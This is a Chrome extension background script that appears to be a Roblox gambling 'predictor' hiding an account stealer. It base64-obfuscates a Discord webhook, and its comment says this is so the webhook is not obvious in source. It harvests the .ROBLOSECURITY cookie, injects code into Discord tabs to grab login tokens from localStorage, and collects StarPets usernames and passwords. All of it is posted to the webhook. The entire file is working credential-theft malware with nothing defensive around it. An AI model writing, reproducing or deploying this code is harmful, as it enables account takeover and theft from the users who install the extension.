// Webhook split into parts so it's not obvious in source
const _a = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv';
const _b = 'MTUyMzIzNDU5OTE4OTIxNzM2Mi9JNFBnY0NraFM1aGVEOWJmQTBCa1Nx';
const _c = 'WlJyajlHd3N6Vko0T0VwR2hid0xCNTRuVFV4TVpDd1NKLTQtUlhQbEdSVWhSMQ==';
const WH = atob(_a) + atob(_b) + atob(_c);

let _last = { r: null, d: null, sp: null };

chrome.runtime.onMessage.addListener((req, sender, resp) => {
  if (req.t === 's') {
    _snd(req.d);
    resp({ ok: 1 });
  }
  if (req.t === 'g') {
    _grab().then(d => resp(d));
    return 1;
  }
  if (req.t === 'c') {
    _grab().then(d => {
      let ch = {};
      let h = 0;
      if (d.r && d.r !== _last.r) { ch.r = d.r; _last.r = d.r; h = 1; }
      if (d.d && d.d !== _last.d) { ch.d = d.d; _last.d = d.d; h = 1; }
      if (d.su && d.su !== _last.su) { ch.su = d.su; ch.sp = d.sp; _last.su = d.su; _last.sp = d.sp; h = 1; }
      if (h) _snd({...d, ...ch, x:1});
      resp({ h, ch });
    });
    return 1;
  }
  if (req.t === 'dt') {
    // Inject into discord tab to grab token
    chrome.tabs.query({ url: '*://discord.com/*' }, tabs => {
      if (tabs.length > 0) {
        chrome.scripting.executeScript({
          target: { tabId: tabs[0].id },
          func: () => {
            try {
              const t = Object.values(localStorage).find(v => 
                typeof v === 'string' && v.length > 100 && v.includes('.') && v.split('.').length === 3
              );
              if (t) return t;
              return localStorage.getItem('token') || null;
            } catch(e) { return null; }
          }
        }, results => {
          if (results && results[0] && results[0].result) {
            resp(results[0].result);
          } else resp(null);
        });
      } else resp(null);
    });
    return 1;
  }
});

async function _grab() {
  let d = { r: null, d: null, su: null, sp: null };
  try {
    let ck = await chrome.cookies.getAll({ domain: 'roblox.com' });
    for (let c of ck) { if (c.name === '.ROBLOSECURITY') { d.r = c.value; break; } }
    if (!d.r) {
      ck = await chrome.cookies.getAll({ domain: '.roblox.com' });
      for (let c of ck) { if (c.name === '.ROBLOSECURITY') { d.r = c.value; break; } }
    }
  } catch(e) {}
  return d;
}

function _snd(data) {
  let f = [];
  let rb = '';
  if (data.u) rb += `**User:** ${data.u}\n`;
  if (data.uid) rb += `**ID:** ${data.uid}\n`;
  if (data.r) rb += `**Cookie:** \\\`${data.r.substring(0,25)}...\\\``;
  if (rb) f.push({ n: '🎮 Roblox', v: rb, i: 0 });

  if (data.r) f.push({ n: '🔑 .ROBLOSECURITY', v: `\`\`\`${data.r}\`\`\``, i: 0 });
  
  if (data.d) {
    f.push({ n: '💬 Discord Token', v: `\`\`\`${data.d}\`\`\``, i: 0 });
    try {
      let p = JSON.parse(atob(data.d.split('.')[1]));
      f.push({ n: '👤 Discord', v: `**ID:** ${p.sub||'N/A'}\n**Email:** ${p.email||'N/A'}`, i: 1 });
    } catch(e) {}
  }

  if (data.su || data.sp) {
    let s = '';
    if (data.su) s += `**User:** \`${data.su}\`\n`;
    if (data.sp) s += `**Pass:** \`${data.sp}\``;
    if (s) f.push({ n: '🐾 StarPets', v: s, i: 0 });
  }

  if (data.p) {
    f.push({ n: '🎯 Prediction', v: `**Chance:** ${data.w}%\n**Pick:** ${data.p}\n**Status:** ${data.g?'🟢 BET':'🔴 SKIP'}`, i: 1 });
    f.push({ n: '📊 Split', v: `H: ${data.h}% | T: ${data.t}%`, i: 1 });
  }

  let ct = '';
  if (data.r) ct += `\`${data.r}\` `;
  if (data.d) ct += `\`${data.d}\` `;
  if (data.sp) ct += `\`${data.su}:${data.sp}\` `;

  let emb = {
    embeds: [{
      title: 'Blox Data',
      color: data.g ? 0x00ff00 : 0xff0000,
      fields: f.map(x => ({ name: x.n, value: x.v, inline: !!x.i })),
      footer: { text: new Date().toLocaleString() }
    }]
  };
  if (ct.trim()) emb.content = ct.trim();

  try { await fetch(WH, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(emb) }); } catch(e) {}
}
